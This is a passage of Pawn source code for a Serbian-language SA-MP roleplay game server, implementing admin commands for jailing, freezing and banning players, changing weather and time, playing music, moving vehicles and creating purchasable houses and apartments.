			    if(PlayerInfo[playerid][xSpecAdmin] == 1 && PlayerInfo[id][xAdmin] >= 1) return SendErrorMessage( playerid, "Ne mozes zatvoriti clana Admin TEAM-a!");
			    if( PlayerInfo[ id ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes zatvoriti igraca koji je vec u zatvoru!");
				if( time < 1 || time > 7000 ) return SendErrorMessage( playerid, "Minute pritvora nemogu biti manje od 1 i vece od 7000 (Odvezite osobu onda u Area51 zatvor) !");
                if( PlayerInfo[ id ][ xUbijen ] == 1 ) return SendErrorMessage( playerid, "Sacekajte igrac se leci." );
				ResetAllWeapons( id );
	    		PlayerInfo[ id ][ xZatvor ] = OBICAN_ZATVOR;
	   			PlayerInfo[ id ][ xZatvorVreme ] = time;
				ClearAnimations( id );
				PlayerCP[ id ] = 0;
				if( IsPlayerAttachedObjectSlotUsed( id, OBJECT_SLOT_RHAND ) ) RemovePlayerAttachedObject( id, OBJECT_SLOT_RHAND );
				SetPlayerSpecialAction( id, SPECIAL_ACTION_NONE );
				PlayerCuffed[ id ] = 0;

                new string[ 128 ];
				format( string, sizeof( string ), "Admin %s je jailovao igraca %s | Razlog: %s", ImeIgraca( playerid ), ImeIgraca( id ), razlog );
				LogSave( "Ostalo/LogJail.log", string );

				new rand = random( sizeof( RandomZatvor ) );
				Novi_SetPlayerPos( id, RandomZatvor[ rand ][ 0 ], RandomZatvor[ rand ][ 1 ],RandomZatvor[ rand ][ 2 ] );
                SetPlayerWorldBounds(id, -1398.697143, -1472.672607, -1443.334228, -1605.534057);
				PlayerInfo[ id ][ xWanted ] = 0;
				Novi_SetPlayerWantedLevel( id, PlayerInfo[ id ][ xWanted ] );
				strmid( ZlocinInfo[ id ][ zPrijavio ], "Nema", 0, strlen("Nema"), 255 );
				strmid( ZlocinInfo[ id ][ zPocinio ], "Nema", 0, strlen("Nema"), 255 );
				strmid( ZlocinInfo[ id ][ zZlocin ], "Nema", 0, strlen("Nema"), 255 );
	            GameTextForPlayer( id, "Ucitavanje ...", 1000, 4 );
			    SetTimerEx( "SlobodnoSada", 6000, false, "i", id );
			    SetCameraBehindPlayer( id ); SetPlayerInterior( id, 0 );
			    SetPlayerVirtualWorld( id, 0 );
			    TogglePlayerControllable( id, 0 );
				SavePlayer( id );

				AI[ playerid ][ aTJail ]++;

				SendClientMessageEx( id, SVETLOCRVENA, "Admin vas je stavio u zatvor na %d minuta.Razlog: %s", time, razlog );
				SendClientMessageEx( playerid, SVETLOCRVENA, "Postavili ste igraca %s u zatvor na %d minuta.Razlog: %s", ImeIgraca( id ), time, razlog );

				format( globalstring, sizeof( globalstring ), "JAIL | Admin je postavio igraca %s u zatvor.", ImeIgraca( id ) );
			   	SCMA( NARACRVENA, globalstring );
			   	
			   	format( globalstring, sizeof( globalstring ), "AJAIL | Admin %s je postavio igraca %s u zatvor na %d minuta.", ImeIgraca( playerid ), ImeIgraca( id ), time, razlog );
			   	AdminPoruka( NARACRVENA, globalstring );
			   	format( globalstring, sizeof( globalstring ), "AJAIL | Razlog: %s.", razlog );
			   	AdminPoruka( NARACRVENA, globalstring );

				return 1;
			}
		}
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:tod( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 4  ) {
        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
		new vreme;
		if( sscanf( params, "i", vreme ) ) {
		    SendUsageMessage( playerid, "/tod [ vreme(0-23) ]");
			return 1;
	    }
	    SetWorldTime( vreme );
	    ServerInfo[ VremeInGame ] = vreme;
		format( globalstring, sizeof( globalstring ), "Vreme stavljeno na %d sati.", vreme );
		SCMA( ZELENA, globalstring );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:vreme( playerid, params[] ) {
	new vreme;
	if( PlayerInfo[ playerid ][ xAdmin ] < 1 )  return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
	if( sscanf( params, "i", vreme ) ) {
        SendUsageMessage( playerid, "/vreme [ broj ]");
        SCM( playerid, SRVBOJA1,"_________________________________________________________Valhalla Vremesnki Panel____");
        SCM( playerid, SRVBOJA1, "| "col_white"1: Sunce | 2: Kisa  | 3: Oluja | 4: Magla  | 5: Pjescana Oluja | 6: Toxic | 7: Draw Distance ");
        SCM( playerid, SRVBOJA1,"_____________________________________________________________________________________");
	}
	if( vreme < 1 || vreme > 7 ) return SendErrorMessage( playerid, "Odabir mora biti veci od 0 i manji od 7");
  	switch( vreme ) {
        case 1: {
	        format( globalstring, sizeof( globalstring ), "VREME | %s je stavio vreme id %d.", ImeIgraca( playerid ), vreme );
	        AdminPoruka( NARACRVENA, globalstring );
	        SetWeather( 6 ); ServerInfo[ Prognozasys ] = 6;
        }
        case 2: {
	        format( globalstring, sizeof( globalstring ), "VREME | %s je stavio vreme id %d.", ImeIgraca( playerid ), vreme );
	        AdminPoruka( NARACRVENA, globalstring );
	        SetWeather( 16 ); ServerInfo[ Prognozasys ] = 16;
        }
        case 3: {
	        format( globalstring, sizeof( globalstring ), "VREME | %s je stavio vreme id %d.", ImeIgraca( playerid ), vreme );
	        AdminPoruka( NARACRVENA, globalstring );
	        SetWeather( 8 ); ServerInfo[ Prognozasys ] = 8;
        }
        case 4: {
	        format( globalstring, sizeof( globalstring ), "VREME | %s je stavio vreme id %d.", ImeIgraca( playerid ), vreme );
	        AdminPoruka( NARACRVENA, globalstring );
	        SetWeather( 9 ); ServerInfo[ Prognozasys ] = 9;
        }
        case 5: {
	        format( globalstring, sizeof( globalstring ), "VREME | %s je stavio vreme id %d.", ImeIgraca( playerid ), vreme );
	        AdminPoruka( NARACRVENA, globalstring );
	        SetWeather( 19 ); ServerInfo[ Prognozasys ] = 19;
        }
        case 6: {
	        format( globalstring, sizeof( globalstring ), "VREME | %s je stavio vreme id %d.", ImeIgraca( playerid ), vreme );
	        AdminPoruka( NARACRVENA, globalstring );
	        SetWeather( 20 ); ServerInfo[ Prognozasys ] = 20;
        }
        case 7: {
	        format( globalstring, sizeof( globalstring ), "VREME | %s je stavio vreme id %d.", ImeIgraca( playerid ), vreme );
	        AdminPoruka( NARACRVENA, globalstring );
	        SetWeather( -1337 );  ServerInfo[ Prognozasys ] = -1337;
		}
	}
	return 1;
}

alias:freeze("zamrzni");
CMD:freeze( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 ) {
        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
		new id;
		if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/freeze [ ID/Deo imena ]");
		if( IsPlayerConnected( id ) ) {
			if( id != INVALID_PLAYER_ID ) {
				TogglePlayerControllable( id, 0 );
				SendInfoMessage( id, "Admin %s vas je zaledio.", ImeIgraca( playerid ) );
				SendInfoMessage( playerid, "Zaledili ste igraca %s.", ImeIgraca( id ) );
			    format( globalstring, sizeof( globalstring ), "FREEZE | %s je zaledio igraca %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
			   	AdminPoruka( NARACRVENA, globalstring );
			}
		}
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

alias:unfreeze("odmrzni");
CMD:unfreeze( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 ) {
        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
		new id;
		if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/unfreeze [ ID/Deo imena ]");
		if( IsPlayerConnected( id ) ) {
			if( id != INVALID_PLAYER_ID ) {
				TogglePlayerControllable( id, 1 );
				SendInfoMessage( id, "Admin %s vas je odledio.", ImeIgraca( playerid ) );
				SendInfoMessage( playerid, "Odledili ste igraca %s.", ImeIgraca( id ) );
			    format( globalstring, sizeof( globalstring ), "UNFREEZE | %s je odledio igraca %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
			   	AdminPoruka( NARACRVENA, globalstring );
			}
		}
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:unbanip( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 4  ) {
		if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
	    new playersip[100];
		if( sscanf( params, "s[100]", playersip ) ) {
			SendUsageMessage( playerid, "/unbanip [ Igracev IP ]");
			return 1;
		}
		AI[ playerid ][ aTUnban ]++;
		ServerInfo[ BanovanihKorisnika ]--;
		format( globalstring, sizeof( globalstring ), "unbanip %s", playersip );
		SendRconCommand( globalstring );
		SendRconCommand( "reloadbans" );
		format( globalstring, 128, "UNBAN | %s je unbanovao IP %s", ImeIgraca( playerid ), playersip );
		AdminPoruka( NARACRVENA, globalstring );
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

new MuzikaUrl[ 256 ];

CMD:replaymusic( playerid, params[] ) {

	StopAudioStreamForPlayer( playerid );
	PlayAudioStreamForPlayer( playerid, MuzikaUrl );
	
	SendInfoMessage( playerid, "Ponovo ste pustili muziku." );
    return 1;
}

CMD:muzika(playerid) {

    if(PlayerInfo[playerid][xAdmin] < 1) return SendErrorMessage(playerid, "Samo admini 2+!");

    ShowPlayerDialog(playerid, dialog_Muzika, DIALOG_STYLE_LIST, "Odaberi pesmu", "Samo Bob - Nemacki Policajci\nSamo Bob - Crni Sin\nMahdi - Bar Bar\nMimi Mercedes - Samo Kes\nRimski - 200\nNucci - VROOM\nRelja - Pakao od zene\nA jesam te volio\nRelja - Made in Balkan\nIn Vivo - Akcent\nAca Lukas - Hotel\nStoja - Do gole koze\nO.D.D.D. - Jala i Buba\nKrtina - TPE ZA SKE", D_ODABERI, D_ODUSTANI);

    return 1;
}

CMD:pustimuziku( playerid, params[] ) {

    if( PlayerInfo[ playerid ][ xAdmin ] >= 1  ) {
        // if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

		new url[ 256 ];
		if( sscanf( params, "s[256]", url ) ) {
			SendUsageMessage( playerid, "/pustimuziku [ url pesme ]");
			return 1;
		}
		
		strmid( MuzikaUrl, url, 0, strlen( url ), 256 );
		foreach( Player, i ) {
		
        	StopAudioStreamForPlayer( i );
  			PlayAudioStreamForPlayer( i, url );
       	}
       	format( globalstring, sizeof( globalstring ), "MUZIKA | Admin %s je pustio pesmu( da prekinete /music( off ) ) |", ImeIgraca( playerid ) );
		SCMA( NARACRVENA, globalstring );
		format( globalstring, sizeof( globalstring ), "MUZIKA | Da bi ponovo pustili kucajte /replaymusic |", ImeIgraca( playerid ) );
		SCMA( NARACRVENA, globalstring );
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

CMD:entercar( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 3  ) {
		if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

		new vehicleid;
		if( sscanf( params, "i", vehicleid ) ) {
			SendUsageMessage( playerid, "/entercar [ ID vozila ]");
			return 1;
		}

		Novi_PutPlayerInVehicle( playerid, vehicleid, 0 );
		SendInfoMessage( playerid, "Usli ste u vozilo ID: %d.", vehicleid );
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

CMD:banip( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 3  ) {
		if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
	    new playersip[100];
		if( sscanf( params, "s[100]", playersip ) ) {
			SendUsageMessage( playerid, "/banip [ Igracev IP ]");
			return 1;
		}
		AI[ playerid ][ aTBan ]++;
		ServerInfo[ BanovanihKorisnika ]++;
		format( globalstring, sizeof( globalstring ), "banip %s", playersip );
		SendRconCommand( globalstring );
		SendRconCommand( "reloadbans" );
		format( globalstring, 128, "BAN | %s je banovao IP %s", ImeIgraca( playerid ), playersip );
		AdminPoruka( NARACRVENA, globalstring );

        new string[ 128 ]; 
        format( string, sizeof( string ), "Admin %s je banovao IP Adresu %s", ImeIgraca( playerid ), playersip);
        LogSave( "Ostalo/LogIPBan.log", string );
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}


CMD:gotocar( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 4  ) {
	    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

		new id;
		if( sscanf(params, "i", id ) ) return SendUsageMessage( playerid, "/gotocar [carid(/dl)]");
		new Float:cwx2, Float:cwy2, Float:cwz2;
		GetVehiclePos( id, cwx2, cwy2, cwz2 );
		if( GetPlayerState( playerid ) == 2 ) {
			new tmpcar = GetPlayerVehicleID( playerid );
			Novi_SetVehiclePos( tmpcar, cwx2, cwy2, cwz2 );
		}
		else
			Novi_SetPlayerPos( playerid, cwx2, cwy2, cwz2 );
		SCM( playerid, BELA, "Teleportirani ste");
		SetPlayerInterior( playerid, 0 );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:getcar( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 3  ) {

		new id;
		if( sscanf( params, "i", id ) ) {
			SendUsageMessage( playerid, "/getcar [carid(/dl)]");
			return 1;
	    }
		new Float:plocx, Float:plocy, Float:plocz;
		GetPlayerPos( playerid, plocx, plocy, plocz );
		Novi_SetVehiclePos( id, plocx, plocy+4, plocz );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:zatvoreni( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xAdmin ] >= 1 ) {
        SCM( playerid, SVETLOPLAVA, "Online igraci u zatvoru/arei:");
		foreach( Player, i ) {
			if( IsPlayerConnected( i ) ) {
		    	if( PlayerInfo[ i ][ xZatvor ] >= 1) {
					format( globalstring, sizeof( globalstring ), "%s (%d) - Zatvorsko vreme: %d minuta", ImeIgraca( i ), i, PlayerInfo[ i ][ xZatvorVreme ] );
					SCM( playerid, SIVA, globalstring );
				}
			}
		}
	} else SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:trazeni( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xAdmin ] >= 1 ) {
        SCM( playerid, SVETLOPLAVA, "Online igraci sa wanted levelom:");
		foreach( Player, i ) {
			if( IsPlayerConnected( i ) ) {
		    	if( PlayerInfo[ i ][ xWanted ] >= 1) {
					format( globalstring, sizeof( globalstring ), "%s (%d) - Wanted: %d", ImeIgraca( i ), i, PlayerInfo[ i ][ xWanted ] );
					SCM( playerid, SIVA, globalstring );
				}
			}
		}
	} else SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:utisani( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xAdmin ] >= 1 ) {
        SCM( playerid, SVETLOPLAVA, "Online utisani igraci:");
		foreach( Player, i ) {
			if( IsPlayerConnected( i ) ) {
		    	if( PlayerInfo[ i ][ xMute ] != 0 ) {
					format( globalstring, sizeof( globalstring ), "%s (%d)", ImeIgraca( i ), i );
					SCM( playerid, SIVA, globalstring );
				}
			}
		}
	} else SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:pweapons( playerid, params[] ) {
	new id;
	if( sscanf( params, "u", id ) ) {
		SendUsageMessage( playerid, "/pweapons [ ID/Deo imena ]");
		return 1;
    }
	if( IsPlayerConnected( id ) ) {
	    if( id != INVALID_PLAYER_ID ) {
	        if( PlayerInfo[ playerid ][ xAdmin ] >= 1 ) {
			    new weapon[13],
					bullets[13];

				format( globalstring, sizeof( globalstring ), "%s", ImeIgraca( id ) );
				SCM( playerid, ZELENA, globalstring );

			    for( new slot = 0; slot < 13; slot++)
                {
                    GetPlayerWeaponData( id, slot, weapon[ slot ], bullets[ slot ] );

                    format( globalstring, sizeof( globalstring ), "    SLOT: %d, ORUZJE: %s, METAKA: %d.", slot, WeapNames[ weapon[ slot ] ], bullets[ slot ] );
				    SCM( playerid, BELA, globalstring );
			    }
			} else {
				SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
				return 1;
			}
		}
	}
	return 1;
}

CMD:maskirani( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xAdmin ] >= 1 ) {
		SCM( playerid, SVETLOPLAVA, "Igraci s maskama:");
		foreach( Player, i) {
			if( Maskuse[ i ] == true ) {
				format( globalstring, sizeof( globalstring ), "** ID maske: Maska_%d ** - %s(%d)", PlayerInfo[ i ][ xMaskID ], ImeIgraca( i ), i);
				SCM( playerid, BELA, globalstring );
			}
		}
    } else SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:napunivozila( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 4  ) {
        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
	    for( new i = 1; i < MAX_VEHICLES; i++ ) {

			Fuel[ i ] = getAmountFuel( i );
			FuelTime[ i ] = 0;
		}
		format( globalstring, sizeof( globalstring ), "GORIVO | %s je napunio sva vozila gorivom.", ImeIgraca( playerid ) );
		AdminPoruka( NARACRVENA, globalstring );
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

alias:odbrojavanje("count");
CMD:odbrojavanje( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 3  ) {
        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
		new seconds,
			string[64];

		if( sscanf( params, "i", seconds ) ) {
			SendErrorMessage( playerid, "Morate unijeti vrijednost u sekundama.");
			return 1;
		}
		if( seconds > 20 ) return SendErrorMessage( playerid, "Sekunde nemogu biti manje od 1 i vece od 20!");
	 	if( cseconds ) return SendErrorMessage( playerid, "Vec je odbrojavanje u tijeku.");
	 	if( seconds > 0 ) {
	 		format( string, 40, "Zapoceli ste odbrojavanje od %d sekundi.", seconds );
	  		SCM( playerid, SVETLOPLAVA, string );
	   		cseconds = seconds+1;
	     	format( string, sizeof( string ), "ODBROJAVANJE | %s koristi komandu /odbrojavanje.", ImeIgraca( playerid ) );
	      	AdminPoruka( NARACRVENA, string );
	   	} else SendErrorMessage( playerid, "Sekunde moraju biti vece od i manje od 20!");
   	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:nstan( playerid, params[] ) {

    				if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
					if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

    				new im = SledeciIDImovine( MAX_IMOVINA ), Float:PozX, Float:PozY, Float:PozZ, string[ 256 ], iimovine[ 40 ];
					GetPlayerPos( playerid, PozX, PozY, PozZ );
				    format( iimovine, sizeof( iimovine ), IM_FILE, im );
					if( fexist( iimovine ) ) return SendErrorMessage( playerid, "ID te imovine vec postoji!" );
				    II[ im ][ iUsage ] = IMOVINA_STAN;
				    II[ im ][ iExit ][ 0 ] = STAN_X;
		    		II[ im ][ iExit ][ 1 ] = STAN_Y;
		    		II[ im ][ iExit ][ 2 ] = STAN_Z;
				    II[ im ][ iPrice ] = STAN_PRICE;
				    II[ im ][ iInterior ] = STAN_INT;
				    II[ im ][ iVrsta ] = 0;
					II[ im ][ iOwned ] = 0;
					II[ im ][ iNeaktivnost ] = 0;
					strmid( II[ im ][ iOwner], "Drzava", 0, strlen( "Drzava" ), 32);
					II[ im ][ iEnter ][ 0 ] = PozX;
					II[ im ][ iEnter ][ 1 ] = PozY;
				   	II[ im ][ iEnter ][ 2 ] = PozZ;
				    II[ im ][ iLocked ] = 0;
				    II[ im ][ iVW ] = im;
				    II[ im ][ iLevel ] = 3;
				    strmid( II[ im ][ iAdress ], UlicaImovine( im ), 0, strlen( UlicaImovine( im ) ), 32);
			    	II[ im ][ iOrmar ] = 0;
					II[ im ][ iSkin ][ 0 ] = 0;
					II[ im ][ iSkin ][ 1 ] = 0;
					II[ im ][ iSkin ][ 2 ] = 0;
					II[ im ][ iSafeStatus ] = 0; II[ im ][ iSafePass ] = 0;
					II[ im ][ iOruzje ][ 0 ] = 0; II[ im ][ iOruzje ][ 1 ] = 0; II[ im ][ iOruzje ][ 2 ] = 0; II[ im ][ iOruzje ][ 3 ] = 0;
					II[ im ][ iMunicija ][ 0 ] = 0; II[ im ][ iMunicija ][ 1 ] = 0; II[ im ][ iMunicija ][ 2 ] = 0; II[ im ][ iMunicija ][ 3 ] = 0;
					II[ im ][ iDrug ][ 0 ] = 0; II[ im ][ iDrug ][ 1 ] = 0; II[ im ][ iDrug ][ 2 ] = 0; II[ im ][ iDrug ][ 3 ] = 0; II[ im ][ iDrug ][ 4 ] = 0;
					II[ im ][ iDrug ][ 5 ] = 0; II[ im ][ iDrug ][ 6 ] = 0; II[ im ][ iDrug ][ 7 ] = 0; II[ im ][ iDrug ][ 8 ] = 0; II[ im ][ iDrug ][ 9 ] = 0;
					II[ im ][ iDrugCode ][ 0 ] = 0; II[ im ][ iDrugCode ][ 1 ] = 0; II[ im ][ iDrugCode ][ 2 ] = 0; II[ im ][ iDrugCode ][ 3 ] = 0; II[ im ][ iDrugCode ][ 4 ] = 0;
					II[ im ][ iDrugCode ][ 5 ] = 0; II[ im ][ iDrugCode ][ 6 ] = 0; II[ im ][ iDrugCode ][ 7 ] = 0; II[ im ][ iDrugCode ][ 8 ] = 0; II[ im ][ iDrugCode ][ 9 ] = 0;
		            II[ im ][ iDoorLevel ] = 0; II[ im ][ iAlarm ] = 0; II[ im ][ iLockLevel ] = 0; II[ im ][ iTime ] = 0; II[ im ][ iPizzaTime ] = 0;
					SaveProperty( im );
				    format( string, sizeof( string ),""col_crvena"Stan na Prodaju"col_white"[ID %d]"col_crvena"\nCena: "col_white"%d$\n"col_crvena"Potreban level: "col_white"%d\n"col_crvena"Adresa: "col_white"%s\n"col_crvena"Za kupovinu "col_white"/kupiimovinu", im, II[ im ][ iPrice ], II[ im ][ iLevel ], II[ im ][ iAdress ] );
				    ImovinaLabel[ im ] = CreateDynamic3DTextLabel( string, 0x33CCFFAA, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 15.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1);
				    ImovinaPickup[ im ] = CreateDynamicPickup(1272, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] );
					SendInfoMessage( playerid, "Uspesno si kreirao stan." );
					return 1;
}

CMD:nkuca( playerid, params[] ) {

            if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
			if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
			new vrsta;
			if( sscanf( params, "i", vrsta ) ) return SendUsageMessage( playerid, "/nkuca [ 1(mala), 2(srednja), 3(velika), 4(PentHouse)." );

			new im = SledeciIDImovine( MAX_IMOVINA ), Float:PozX, Float:PozY, Float:PozZ, string[ 256 ], iimovine[ 40 ];
			if( vrsta < 1 || vrsta > 4 ) return SendErrorMessage( playerid, "Pogresna vrsta!" );
			GetPlayerPos( playerid, PozX, PozY, PozZ );
		    format( iimovine, sizeof( iimovine ), IM_FILE, im );
			if( fexist( iimovine ) ) return SendErrorMessage( playerid, "ID te imovine vec postoji!" );
   			if( vrsta == MALA_KUCA ) {
			    II[ im ][ iUsage ] = IMOVINA_KUCA;
			    II[ im ][ iExit ][ 0 ] = MALA_KUCA_X;
	    		II[ im ][ iExit ][ 1 ] = MALA_KUCA_Y;
	    		II[ im ][ iExit ][ 2 ] = MALA_KUCA_Z;
			    II[ im ][ iPrice ] = MALA_KUCA_PRICE;
			    II[ im ][ iInterior ] = MALA_KUCA_INT;
			    II[ im ][ iVrsta ] = MALA_KUCA;
			}
			else if( vrsta == SREDNJA_KUCA ) {
			    II[ im ][ iUsage ] = IMOVINA_KUCA;
			    II[ im ][ iExit ][ 0 ] = SREDNJA_KUCA_X;
	    		II[ im ][ iExit ][ 1 ] = SREDNJA_KUCA_Y;
	    		II[ im ][ iExit ][ 2 ] = SREDNJA_KUCA_Z;
			    II[ im ][ iPrice ] = SREDNJA_KUCA_PRICE;
			    II[ im ][ iInterior ] = SREDNJA_KUCA_INT;
			    II[ im ][ iVrsta ] = SREDNJA_KUCA;
			}
			else if( vrsta == VELIKA_KUCA ) {
			    II[ im ][ iUsage ] = IMOVINA_KUCA;
			    II[ im ][ iExit ][ 0 ] = VELIKA_KUCA_X;
	    		II[ im ][ iExit ][ 1 ] = VELIKA_KUCA_Y;
	    		II[ im ][ iExit ][ 2 ] = VELIKA_KUCA_Z;
			    II[ im ][ iPrice ] = VELIKA_KUCA_PRICE;
			    II[ im ][ iInterior ] = VELIKA_KUCA_INT;
			    II[ im ][ iVrsta ] = VELIKA_KUCA;
			}
			else if( vrsta == PENTHOUSE_KUCA ) {
			    II[ im ][ iUsage ] = IMOVINA_KUCA;
			    II[ im ][ iExit ][ 0 ] = PENTHOUSE_KUCA_X;
	    		II[ im ][ iExit ][ 1 ] = PENTHOUSE_KUCA_Y;
	    		II[ im ][ iExit ][ 2 ] = PENTHOUSE_KUCA_Z;
			    II[ im ][ iPrice ] = PENTHOUSE_KUCA_PRICE;
			    II[ im ][ iInterior ] = PENTHOUSE_KUCA_INT;
			    II[ im ][ iVrsta ] = PENTHOUSE_KUCA;
			}
			II[ im ][ iOwned ] = 0;
			II[ im ][ iNeaktivnost ] = 0;
			strmid( II[ im ][ iOwner], "Drzava", 0, strlen( "Drzava" ), 32);
			II[ im ][ iEnter ][ 0 ] = PozX;
			II[ im ][ iEnter ][ 1 ] = PozY;
		   	II[ im ][ iEnter ][ 2 ] = PozZ;
		    II[ im ][ iLocked ] = 0;
		    II[ im ][ iVW ] = im;
		    II[ im ][ iOrmar ] = 0;
		    II[ im ][ iLevel ] = 5;
		    strmid( II[ im ][ iAdress ], UlicaImovine( im ), 0, strlen( UlicaImovine( im ) ), 32);
			II[ im ][ iSkin ][ 0 ] = 0;
			II[ im ][ iSkin ][ 1 ] = 0;
			II[ im ][ iSkin ][ 2 ] = 0;
			II[ im ][ iSafeStatus ] = 0; II[ im ][ iSafePass ] = 0;
			II[ im ][ iOruzje ][ 0 ] = 0; II[ im ][ iOruzje ][ 1 ] = 0; II[ im ][ iOruzje ][ 2 ] = 0; II[ im ][ iOruzje ][ 3 ] = 0;
			II[ im ][ iMunicija ][ 0 ] = 0; II[ im ][ iMunicija ][ 1 ] = 0; II[ im ][ iMunicija ][ 2 ] = 0; II[ im ][ iMunicija ][ 3 ] = 0;
			II[ im ][ iDrug ][ 0 ] = 0; II[ im ][ iDrug ][ 1 ] = 0; II[ im ][ iDrug ][ 2 ] = 0; II[ im ][ iDrug ][ 3 ] = 0; II[ im ][ iDrug ][ 4 ] = 0;
			II[ im ][ iDrug ][ 5 ] = 0; II[ im ][ iDrug ][ 6 ] = 0; II[ im ][ iDrug ][ 7 ] = 0; II[ im ][ iDrug ][ 8 ] = 0; II[ im ][ iDrug ][ 9 ] = 0;
			II[ im ][ iDrugCode ][ 0 ] = 0; II[ im ][ iDrugCode ][ 1 ] = 0; II[ im ][ iDrugCode ][ 2 ] = 0; II[ im ][ iDrugCode ][ 3 ] = 0; II[ im ][ iDrugCode ][ 4 ] = 0;
			II[ im ][ iDrugCode ][ 5 ] = 0; II[ im ][ iDrugCode ][ 6 ] = 0; II[ im ][ iDrugCode ][ 7 ] = 0; II[ im ][ iDrugCode ][ 8 ] = 0; II[ im ][ iDrugCode ][ 9 ] = 0;
	        II[ im ][ iDoorLevel ] = 0; II[ im ][ iAlarm ] = 0; II[ im ][ iLockLevel ] = 0; II[ im ][ iTime ] = 0; II[ im ][ iPizzaTime ] = 0;
			SaveProperty( im );
		    format( string, sizeof( string ),"{F53D00}Kuca na Prodaju"col_white"[ID %d]{F53D00}\nVrsta: "col_white"%s{F53D00}\nCena: "col_white"%d$\n{F53D00}Potreban level: "col_white"%d\n{F53D00}Adresa: "col_white"%s\n{F53D00}Za kupovinu "col_white"/kupiimovinu", im, getTypePName( II[ im ][ iVrsta ] ), II[ im ][ iPrice ], II[ im ][ iLevel ], II[ im ][ iAdress ] );
		    ImovinaLabel[ im ] = CreateDynamic3DTextLabel( string, 0x33CCFFAA, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 15.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1);
